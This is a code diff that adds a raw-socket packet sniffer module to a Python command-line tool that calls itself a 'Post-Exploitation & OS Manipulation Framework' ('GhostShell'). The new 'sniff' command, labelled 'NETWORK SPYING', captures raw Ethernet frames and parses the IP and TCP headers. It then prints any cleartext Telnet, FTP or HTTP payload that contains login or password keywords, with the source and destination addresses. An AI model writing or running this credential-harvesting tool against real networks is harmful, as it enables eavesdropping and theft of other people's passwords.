@@ -13,6 +13,7 @@ from rich.progress import Progress, SpinnerColumn, TextColumn
 from rich.panel import Panel
 import concurrent.futures
 import platform
+import struct
 
 app = typer.Typer(help="GhostShell - Post-Exploitation & OS Manipulation Framework")
 console = Console()
@@ -334,6 +335,93 @@ def timestomp(
         
     except Exception as e:
         console.print(f"[red]Operation failed: {e}[/red]")
+
+# --- MODULE 7: RAW SOCKET SNIFFER (Network Eavesdropping) ---
+
+@app.command()
+def sniff(
+    interface: str = typer.Option("eth0", help="Network Interface to sniff on"),
+    count: int = typer.Option(0, help="Number of packets to capture (0 = infinite)")
+):
+    """
+    [NETWORK SPYING] Raw Socket Sniffer.
+    
+    Captures traffic in Promiscuous Mode looking for cleartext credentials.
+    Under the hood: Uses socket.AF_PACKET to bypass the TCP/IP stack and read raw Ethernet frames.
+    Targets: Telnet, FTP, HTTP (non-SSL) containing 'USER', 'PASS', 'LOGIN'.
+    """
+    console.print(Panel(f"Sniffing on {interface} for secrets...", title="Packet Sniffer", style="bold red"))
+    
+    if platform.system() != "Linux":
+        console.print("[red]Error: Raw Sockets only work on Linux![/red]")
+        return
+
+    try:
+        # Create a Raw Socket (ETH_P_ALL = 0x0003)
+        conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
+        conn.bind((interface, 0))
+    except PermissionError:
+        console.print("[red]Error: Root privileges required for Raw Sockets.[/red]")
+        return
+    except Exception as e:
+        console.print(f"[red]Error initializing socket: {e}[/red]")
+        return
+
+    captured = 0
+    try:
+        while True:
+            if count > 0 and captured >= count:
+                break
+                
+            raw_data, addr = conn.recvfrom(65535)
+            
+            # 1. Parse Ethernet Header (First 14 bytes)
+            dest_mac, src_mac, eth_proto = struct.unpack('! 6s 6s H', raw_data[:14])
+            
+            # Check if Protocol is IP (0x0800 = 8)
+            if socket.ntohs(eth_proto) == 8:
+                
+                # 2. Parse IP Header (Next 20 bytes usually)
+                ip_header = raw_data[14:34]
+                iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
+                protocol = iph[6] # TCP is 6
+                
+                # 3. Check for TCP
+                if protocol == 6:
+                    # Parse TCP Header to find Data Offset
+                    # IP Header length is in the first byte (IHL), usually 20 bytes
+                    version_ihl = iph[0]
+                    ihl = version_ihl & 0xF
+                    iph_length = ihl * 4
+                    
+                    tcp_header = raw_data[14+iph_length : 14+iph_length+20]
+                    tcph = struct.unpack('!HHLLBBHHH', tcp_header)
+                    
+                    src_port = tcph[0]
+                    dest_port = tcph[1]
+                    
+                    # Calculate Data Offset to find Payload
+                    doff_reserved = tcph[4]
+                    tcph_length = (doff_reserved >> 4) * 4
+                    
+                    header_size = 14 + iph_length + tcph_length
+                    payload = raw_data[header_size:]
+                    
+                    # 4. Analyze Payload for Secrets
+                    try:
+                        decoded = payload.decode('utf-8', errors='ignore')
+                        keywords = ["USER", "PASS", "LOGIN", "password", "admin"]
+                        
+                        if any(key in decoded.upper() for key in keywords):
+                            console.print(f"\n[bold red]ALERT: Sensitive Data Found![/bold red]")
+                            console.print(f"From: {socket.inet_ntoa(iph[8])}:{src_port} -> To: {socket.inet_ntoa(iph[9])}:{dest_port}")
+                            console.print(Panel(decoded.strip(), style="yellow"))
+                            captured += 1
+                    except:
+                        pass
+
+    except KeyboardInterrupt:
+        console.print("\n[yellow]Sniffer stopped.[/yellow]")
 
 if __name__ == "__main__":
     app()
